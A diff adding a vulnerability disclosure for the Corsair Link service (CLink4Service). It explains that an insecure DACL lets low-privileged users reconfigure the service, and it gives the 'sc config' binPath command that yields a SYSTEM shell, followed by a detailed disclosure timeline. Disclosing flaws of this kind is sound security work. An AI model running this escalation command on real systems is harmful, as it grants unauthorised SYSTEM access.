@@ -1,0 +1,58 @@
+Product Version: Corsair Link Version 4.9.7.35 
+Downloaded from: https://www.corsair.com/us/en/downloads
+
+Operating System tested on: Windows 10 1803 (x64)
+
+Vulnerability: Corsair Link Service Permission Elevation of Privilege 
+
+Brief Description: The Corsair Link Service (CLink4Service) has an insecure DACL that allows low privileged users “GenericAll” over the service, resulting in elevation of privilege to “NT AUTHORITY\SYSTEM”
+
+Vulnerability Explanation:
+
+The Corsair Link software has a service called “CLink4Service” that grants any user full control over the service:
+
+C:\Users\lowpriv> Get-AccessibleService -Name "CLink4Service"
+
+TokenId Access        Name
+------- ------        ----
+E1E61   GenericAll    CLink4Service
+
+
+
+By granting “GenericAll” to any user, a low privileged process can simply change the binPath of the service to any binary with any parameters:
+
+C:\Users\lowpriv> sc config CLink4Service binPath= "C:\Windows\System32\cmd.exe /c cmd.exe"
+[SC] ChangeServiceConfig SUCCESS
+
+After rebooting, cmd.exe will be running as “NT AUTHORITY\SYSTEM”
+
+
+Disclosure TimeLine:
+01/23/19: Attempted to submit report to security@corsair.com, email address bounced
+01/24/19: Used Twitter to attempt to find a way to report the vulnerability (https://twitter.com/enigma0x3/status/1088631329812594689)
+01/25/19: Contacted by @CorsairSupport to submit the report via support.corsair.com
+01/25/19: Submitted bug report to Corsair via a support ticket at support.corsair.com
+01/28/19: Corsair Support acknowledged the report and forwarded it to the development team
+02/03/19: Corsair Support informed me a fix has been published (http://forum.corsair.com/v3/showthread.php?t=155646). They supplied
+me a link to the fixed version, in which I tested. In that version, the vulnerability was still present
+02/04/19: Responded to the support ticket noting the vulnerability was still present
+02/15/19: Asked Corsair Support for an update
+02/22/19: Corsair Support informed me that LINK is no longer supported software and will not be receiving security updates (?????). They noted to use iCUE instead.
+02/22/19: Asked Corsair Support why I was informed of a fix (http://forum.corsair.com/v3/showthread.php?t=155646) if LINK is no longer updated. Also informed
+them that LINK is still on https://www.corsair.com/us/en/downloads and if it is EOL, it should be removed ASAP
+02/22/19: Corsair Support informs me again that LINK will not be getting updates
+02/22/19: Informed Corsair Support that there was a lot of contradicting information being provided. Also informed them that while
+iCUE is the replacement for LINK, the iCUE installer DOES NOT remove the old LINK version, meaning any user who has ever used LINK
+will remain vulnerable
+02/22/19: Asked Twitter for another contact method for Corsair (https://twitter.com/enigma0x3/status/1099032821698609154)
+02/22/19: Contacted by an employee of Corsair via Twitter
+02/25/19: Corsair Support informed me that they are simply consumer tech support and that they will forward the concerns
+to the development team, but will be closing the ticket
+02/25/19: Informed Corsair Support that I am in contact with someone else and will be working with them directly
+02/25/19: Support ticket closed
+02/28/19: Through backchannels, Corsair published a valid fixed build and replaced the vulnerable build on https://www.corsair.com/us/en/downloads
+02/28/19: Report publicly disclosed
+
+
+
+
